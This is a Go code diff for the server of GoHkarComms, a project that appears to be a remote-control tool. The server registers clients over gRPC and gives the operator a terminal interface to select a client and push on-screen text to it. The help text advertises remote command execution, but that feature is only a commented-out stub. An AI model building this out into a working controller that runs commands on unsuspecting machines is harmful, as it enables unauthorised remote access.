@@ -1,12 +1,17 @@
 package main
 
 import (
-	"bufio"
+	"encoding/json"
 	"log"
 	"net"
 	"os"
+	"strings"
 
 	pb "github.com/Xart3mis/GoHkarComms/client_data_pb"
+	tea "github.com/charmbracelet/bubbletea"
+	"github.com/charmbracelet/lipgloss"
+	"github.com/fatih/color"
+	"github.com/magodo/textinput"
 
 	"golang.org/x/net/context"
 	"google.golang.org/grpc"
@@ -16,37 +21,28 @@ type server struct {
 	pb.ConsumerServer
 }
 
-var on_screen_text string = ""
+var client_ids []string
+var client_onscreentext map[string]string = make(map[string]string)
+
+var current_id string = ""
 
 func main() {
 	go func() {
-		scanner := bufio.NewScanner(os.Stdin)
-		for scanner.Scan() {
-			on_screen_text = scanner.Text()
-		}
-		if err := scanner.Err(); err != nil {
-			os.Exit(1)
+		p := tea.NewProgram(initialModel(), tea.WithAltScreen())
+
+		if err := p.Start(); err != nil {
+			log.Fatal(err)
 		}
 	}()
-	// NewServer creates a gRPC server which has no service registered and has not started
-	// to accept requests yet.
+
 	s := grpc.NewServer()
-	lis, err := net.Listen("tcp", ":8000")
+	lis, err := net.Listen("tcp", "0.0.0.0:8000")
 	if err != nil {
 		log.Fatalf("Failed to listen: %v", err)
 	}
 
-	// We are making use of the function that compiled proto made for us to register
-	// our GRPC server so that the clients can make use of the functions tide to our
-	// server remotely via the GRPC server (like MakeTransaction function)
-
-	// The first argument is the grpc server instance
-	// The second argument is the service who's methods we want to expose (in our case)
-	// we have put it in this program only
 	pb.RegisterConsumerServer(s, &server{})
-	// Serve accepts incoming connections on the listener lis, creating a new ServerTransport
-	// and service goroutine for each. The service goroutines read gRPC requests and then
-	// call the registered handlers to reply to them.
+
 	err = s.Serve(lis)
 	if err != nil {
 		log.Fatalf("Failed to serve: %v", err)
@@ -54,12 +50,159 @@ func main() {
 
 }
 
-func (s *server) UpdateClients(ctx context.Context, in *pb.ClientDataRequest) (*pb.ClientDataResponse, error) {
-	return &pb.ClientDataResponse{ClientData: map[string]*pb.ClientData{
-		in.ClientId: {
-			OnScreenText: on_screen_text,
-			ShouldUpdate: len(on_screen_text) > 0,
+func (s *server) RegisterClient(ctx context.Context, in *pb.ClientDataRequest) (*pb.RegisterResponse, error) {
+	client_ids = append(client_ids, in.ClientId)
+	return &pb.RegisterResponse{Status: 0}, nil
+}
+
+func Contains(sl []string, name string) bool {
+	for _, value := range sl {
+		if value == name {
+			return true
+		}
+	}
+	return false
+}
+
+func (s *server) GetOnScreenText(ctx context.Context, in *pb.ClientDataRequest) (*pb.ClientDataOnScreenTextResponse, error) {
+	if !Contains(client_ids, in.ClientId) {
+		client_ids = append(client_ids, in.ClientId)
+	}
+	if in.ClientId == current_id {
+		return &pb.ClientDataOnScreenTextResponse{OnScreen: &pb.ClientOnScreenData{
+			ShouldUpdate: len(client_onscreentext[current_id]) > 0,
+			OnScreenText: client_onscreentext[current_id],
 		},
-	},
-	}, nil
+		}, nil
+	}
+	return &pb.ClientDataOnScreenTextResponse{OnScreen: &pb.ClientOnScreenData{}}, nil
+}
+
+type model struct {
+	textInput      textinput.Model
+	typing         bool
+	showhelplist   bool
+	showclientlist bool
+	err            error
+	clients        []string
+}
+
+func initialModel() model {
+	ti := textinput.NewModel()
+	ti.Placeholder = "help"
+
+	red := color.New(color.FgRed).SprintFunc()
+	ti.Prompt = red(">> ")
+	ti.PromptStyle.Bold(true)
+
+	ti.PromptStyle.PaddingRight(10)
+	ti.Focus()
+	ti.CharLimit = 156
+	ti.Width = 20
+
+	ti.CandidateWords = []string{"help", "settext", "select", "exit", "exec", "list_clients"}
+	ti.StyleCandidate.Foreground(lipgloss.Color("#BC4749"))
+	ti.CandidateViewMode = textinput.CandidateViewHorizental
+
+	return model{
+		textInput:      ti,
+		err:            nil,
+		typing:         true,
+		showhelplist:   false,
+		showclientlist: false,
+		clients:        client_ids,
+	}
+}
+
+func (m model) Init() tea.Cmd {
+	return textinput.Blink
+}
+
+func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
+	var cmd tea.Cmd
+	switch msg := msg.(type) {
+	case tea.KeyMsg:
+		switch msg.String() {
+		case "ctrl+c":
+			os.Exit(0)
+			return m, tea.Quit
+
+		case "esc", "q":
+			m.typing = true
+			m.showhelplist = false
+			m.showclientlist = false
+			return m, nil
+
+		case "enter":
+			m.clients = client_ids
+			m.typing = false
+
+			// if len(m.textInput.Value()) > 4 && m.textInput.Value()[:4] == "exec" {
+			// 	re := regexp.MustCompile("(`(?:`??[^`]*?`))")
+
+			// 	fmt.Println(string(re.Find([]byte(m.textInput.Value()))))
+			// }
+
+			if len(m.textInput.Value()) > 6 && m.textInput.Value()[:6] == "select" {
+				split_str := strings.Split(m.textInput.Value(), " ")
+				if len(split_str) > 2 {
+					panic("select only takes 1 argument")
+				}
+				current_id = split_str[1]
+			}
+
+			if len(m.textInput.Value()) > 7 && m.textInput.Value()[:7] == "settext" {
+				split_str := strings.Split(m.textInput.Value(), " ")
+				if len(split_str) > 2 {
+					panic("settext only takes 1 argument")
+				}
+				client_onscreentext[current_id] = split_str[1]
+			}
+
+			switch m.textInput.Value() {
+			case "help":
+				m.showhelplist = true
+				return m, nil
+			case "exit":
+				return m, tea.Quit
+			case "list_clients":
+				m.showclientlist = true
+				return m, nil
+			default:
+				return m, nil
+			}
+		}
+	case error:
+		m.err = msg
+		return m, nil
+	}
+
+	if m.typing {
+		m.textInput, cmd = m.textInput.Update(msg)
+		return m, cmd
+	}
+
+	return m, nil
+}
+
+func (m model) View() string {
+	if m.typing {
+		return m.textInput.View()
+	} else if m.showhelplist {
+		yellow := color.New(color.FgYellow).SprintFunc()
+		green := color.New(color.FgGreen).SprintFunc()
+
+		return m.textInput.View() + "\n\n" + green("help") + "\nshow this help dialog (usage: " + yellow("help") + ")\n\n" +
+			green("select") + "\nselect a client to connect to (usage: " + yellow("select [`client id`]") + ")\n\n" +
+			green("exit") + "\nexit the server (usage: " + yellow("exit") + ")\n\n" +
+			green("settext") + "\nset on screen text for selected client (usage: " + yellow("settext [`text`]") + ")\n\n" +
+			green("exec") + "\nexecute command on selected client (usage: " + yellow("exec [`command string`]") + ")\n\n" +
+			green("list_clients") + "\nlist currently connected clients (usage: " + yellow("list_clients [client id]") + ")\n"
+	} else if m.showclientlist {
+		Magenta := color.New(color.FgMagenta).SprintFunc()
+		b, _ := json.MarshalIndent(m.clients, "", "\t")
+		return m.textInput.View() + "\n\n" + Magenta(string(b))
+	}
+
+	return m.textInput.View()
 }
